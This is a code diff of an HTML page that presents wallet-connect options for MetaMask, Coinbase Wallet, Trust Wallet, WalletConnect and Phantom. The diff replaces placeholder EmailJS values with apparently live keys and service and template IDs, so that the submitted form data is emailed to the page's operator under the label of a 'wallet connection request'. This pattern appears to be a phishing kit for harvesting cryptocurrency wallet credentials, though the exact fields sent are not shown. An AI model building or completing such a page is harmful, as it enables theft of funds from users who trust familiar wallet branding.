@@ -10,7 +10,7 @@
     <script type="text/javascript">
         // Initialize EmailJS with your public key
         (function() {
-            emailjs.init('YOUR_PUBLIC_KEY'); // Replace with your actual EmailJS public key
+            emailjs.init('LnHXvPcuZun0dJD7P'); // Replace with your actual EmailJS public key
         })();
     </script>
 </head>
@@ -21,23 +21,23 @@
             
             <!-- Horizontal wallet options -->
             <div class="flex items-center justify-start space-x-6 w-full overflow-x-auto py-2 px-4">
-                <div class="wallet-option cursor-pointer bg-[#262E41] rounded-lg p-4 text-center hover:bg-[#303950] transition-all w-48 flex-shrink-0" data-wallet="MetaMask">
+                <div class="wallet-option cursor-pointer  rounded-lg p-4 text-center hover:bg-[#303950] transition-all w-48 flex-shrink-0" data-wallet="MetaMask">
                     <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask" class="w-16 h-16 mx-auto mb-2">
                     <span class="text-white text-sm font-medium">MetaMask</span>
                 </div>
-                <div class="wallet-option cursor-pointer bg-[#262E41] rounded-lg p-4 text-center hover:bg-[#303950] transition-all w-48 flex-shrink-0" data-wallet="Coinbase">
+                <div class="wallet-option cursor-pointer  rounded-lg p-4 text-center hover:bg-[#303950] transition-all w-48 flex-shrink-0" data-wallet="Coinbase">
                     <img src="https://th.bing.com/th?id=ODLS.31ae2b0b-8a31-41e9-a2bb-db0b5be33948&w=32&h=32&o=6&pid=1.2" alt="Coinbase" class="w-16 h-16 mx-auto mb-2">
                     <span class="text-white text-sm font-medium">Coinbase Wallet</span>
                 </div>
-                <div class="wallet-option cursor-pointer bg-[#262E41] rounded-lg p-4 text-center hover:bg-[#303950] transition-all w-48 flex-shrink-0" data-wallet="TrustWallet">
+                <div class="wallet-option cursor-pointer  rounded-lg p-4 text-center hover:bg-[#303950] transition-all w-48 flex-shrink-0" data-wallet="TrustWallet">
                     <img src="https://th.bing.com/th?id=ODLS.d2b09632-66ef-42ad-90ec-ff9770ad2107&w=32&h=32&o=6&pid=1.2" alt="Trust Wallet" class="w-16 h-16 mx-auto mb-2">
                     <span class="text-white text-sm font-medium">Trust Wallet</span>
                 </div>
-                <div class="wallet-option cursor-pointer bg-[#262E41] rounded-lg p-4 text-center hover:bg-[#303950] transition-all w-48 flex-shrink-0" data-wallet="WalletConnect">
+                <div class="wallet-option cursor-pointer  rounded-lg p-4 text-center hover:bg-[#303950] transition-all w-48 flex-shrink-0" data-wallet="WalletConnect">
                     <img src="https://th.bing.com/th?id=ODLS.188f3190-bfb1-4bf3-b5ff-d5ee7e27b60d&w=32&h=32&qlt=91&pcl=fffffa&o=6&pid=1.2" alt="WalletConnect" class="w-16 h-16 mx-auto mb-2">
                     <span class="text-white text-sm font-medium">WalletConnect</span>
                 </div>
-                <div class="wallet-option cursor-pointer bg-[#262E41] rounded-lg p-4 text-center hover:bg-[#303950] transition-all w-48 flex-shrink-0" data-wallet="Phantom">
+                <div class="wallet-option cursor-pointer  rounded-lg p-4 text-center hover:bg-[#303950] transition-all w-48 flex-shrink-0" data-wallet="Phantom">
                     <img src="https://th.bing.com/th?id=OSAAS.B9092CA4649C3E1BAC29773B49B27B6F80607D38467C33F0B903BDD20BCA5771&w=72&h=72&c=1&rs=1&o=6&pid=TechQna" alt="Phantom" class="w-16 h-16 mx-auto mb-2">
                     <span class="text-white text-sm font-medium">Phantom</span>
                 </div>
@@ -182,7 +182,7 @@
             };
 
             // Send email using EmailJS
-            emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
+            emailjs.send('service_z06zpfh', 'template_prguc14', templateParams)
                 .then(function(response) {
                     console.log('SUCCESS!', response.status, response.text);
                     alert('Wallet connection request sent successfully!');
